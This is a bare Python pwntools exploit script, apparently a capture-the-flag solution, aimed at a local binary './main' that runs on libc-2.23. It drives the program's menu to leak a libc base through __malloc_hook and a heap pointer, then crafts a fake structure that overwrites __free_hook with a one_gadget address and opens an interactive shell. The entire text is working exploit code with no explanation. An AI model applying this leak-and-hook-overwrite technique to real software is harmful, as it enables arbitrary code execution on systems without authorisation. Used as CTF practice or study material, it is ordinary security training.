from pwn import*
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def init():
	menu(1)
def create():
	menu(2)
def new(size):
	menu(3)
	p.sendlineafter('size:',str(size))
def Set(content):
	menu(4)
	p.sendafter('content:',content)
def show():
	menu(5)
def size():
	menu(6)
p = process('./main')
elf =ELF('./main')
libc =ELF('./libc-2.23.so')
context.log_level = 'DEBUG'
init()
create()
init()
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x68
log.info('LIBC:\t' + hex(libc_base))
create()
new(0x10)
show()
p.recvuntil('show:\n')
p.recv(8)
heap = u64(p.recv(8))
log.info('HEAP:\t' + hex(heap))
new(0x100)
create()
Set('\x00'*0x10 + p64(libc_base + libc.sym['free']) + p64(0x21) + p64(heap) + p64(libc_base + libc.sym['__free_hook']))
Set(p64(libc_base + 0xF1207))
size()
p.interactive()
